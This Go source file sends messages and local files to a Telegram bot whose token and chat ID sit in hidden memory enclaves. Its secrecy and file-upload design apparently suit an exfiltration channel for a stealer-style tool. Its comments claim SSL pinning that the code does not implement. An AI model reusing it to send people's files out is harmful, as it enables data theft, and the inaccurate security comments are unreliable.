package telegram

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"strings"
	"time"
	"watsap/utils/config"
	"watsap/utils/files"
	"watsap/utils/logger"
)

// Send message to Telegram using HTTP client with SSL Pinning transport
func TgSendMsg(msg string) {
	logger.Debug("Telegram", "Sending message...")

	// Open ChatID enclave
	chatIDBuf, err := config.ChatIDEnclave.Open()
	if err != nil || chatIDBuf.Size() == 0 {
		logger.Warn("Telegram", "Chat ID enclave unavailable or empty")
		return
	}
	defer chatIDBuf.Destroy()

	// Open BotToken enclave
	tokenBuf, err := config.BotTokenEnclave.Open()
	if err != nil || tokenBuf.Size() == 0 {
		logger.Warn("Telegram", "Bot Token enclave unavailable or empty")
		return
	}
	defer tokenBuf.Destroy()

	// 1. Construct JSON body payload safely with raw bytes
	msgBytes, err := json.Marshal(msg)
	if err != nil {
		logger.Error("Telegram", "Error marshaling msg: %v", err)
		return
	}

	jsonBuf := new(bytes.Buffer)
	jsonBuf.WriteString(`{"chat_id":"`)
	jsonBuf.Write(chatIDBuf.Bytes())
	jsonBuf.WriteString(`","text":`)
	jsonBuf.Write(msgBytes)
	jsonBuf.WriteString(`,"parse_mode":"HTML"}`)

	jsonData := jsonBuf.Bytes()
	defer config.WipeMemory(jsonData)

	// Construct request URL
	url := "https://api.telegram.org/bot" + string(tokenBuf.Bytes()) + "/sendMessage"

	req, err := http.NewRequest("POST", url, bytes.NewReader(jsonData))
	if err != nil {
		logger.Error("Telegram", "Error creating HTTP request: %v", err)
		return
	}
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("User-Agent", "Watsap/11.00")

	client := &http.Client{
		Timeout: 15 * time.Second,
	}

	resp, err := client.Do(req)
	if err != nil {
		logger.Error("Telegram", "Connection error: %v", err)
		return
	}
	defer resp.Body.Close()

	respBody, _ := io.ReadAll(resp.Body)
	respStr := string(respBody)

	if resp.StatusCode == http.StatusOK && strings.Contains(respStr, `"ok":true`) {
		logger.Info("Telegram", "Message sent successfully via Telegram")
	} else {
		logger.Warn("Telegram", "Response (Status %d): %s", resp.StatusCode, respStr)
	}
}

// Send file with caption to Telegram using HTTP client with SSL Pinning transport
func TgSendFile(filePath string, caption string) error {
	if !files.Exists(filePath) {
		logger.Debug("Telegram", "File not found, skipping send: %s", filePath)
		return fmt.Errorf("file not found: %s", filePath)
	}

	// Open ChatID enclave
	chatIDBuf, err := config.ChatIDEnclave.Open()
	if err != nil || chatIDBuf.Size() == 0 {
		logger.Warn("Telegram", "Chat ID enclave unavailable or empty")
		return fmt.Errorf("chatID unavailable or empty")
	}
	defer chatIDBuf.Destroy()

	// Open BotToken enclave
	tokenBuf, err := config.BotTokenEnclave.Open()
	if err != nil || tokenBuf.Size() == 0 {
		logger.Warn("Telegram", "Bot Token enclave unavailable or empty")
		return fmt.Errorf("bot token unavailable or empty")
	}
	defer tokenBuf.Destroy()

	form := map[string][]byte{
		"document":   []byte("@" + filePath),
		"chat_id":    chatIDBuf.Bytes(),
		"caption":    []byte(caption),
		"parse_mode": []byte("HTML"),
	}

	logger.Debug("Telegram", "Sending file via Telegram API: %s", filePath)

	ct, bodyBuf, err := CreateForm(form)
	if err != nil {
		logger.Error("Telegram", "Error creating form: %v", err)
		return err
	}

	bodyBytes := bodyBuf.Bytes()
	defer config.WipeMemory(bodyBytes)

	url := "https://api.telegram.org/bot" + string(tokenBuf.Bytes()) + string(config.TgFileApiURLBytes)

	req, err := http.NewRequest("POST", url, bytes.NewReader(bodyBytes))
	if err != nil {
		logger.Error("Telegram", "Error creating file HTTP request: %v", err)
		return err
	}
	req.Header.Set("Content-Type", ct)
	req.Header.Set("User-Agent", "Watsap/11.00")

	client := &http.Client{
		Timeout: 30 * time.Second,
	}

	resp, err := client.Do(req)
	if err != nil {
		logger.Error("Telegram", "Connection error: %v", err)
		return err
	}
	defer resp.Body.Close()

	respBody, _ := io.ReadAll(resp.Body)
	respStr := string(respBody)

	if resp.StatusCode == http.StatusOK && strings.Contains(respStr, `"ok":true`) {
		logger.Info("Telegram", "File sent successfully via Telegram: %s", filePath)
		return nil
	} else {
		logger.Warn("Telegram", "File response (Status %d): %s", resp.StatusCode, respStr)
		return fmt.Errorf("telegram response (%d): %s", resp.StatusCode, respStr)
	}
}

/*
test bot
func TestBot() {
	fmt.Println("Testing bot...")
	TgSendFile("geo.w", "Test file")
}
*/
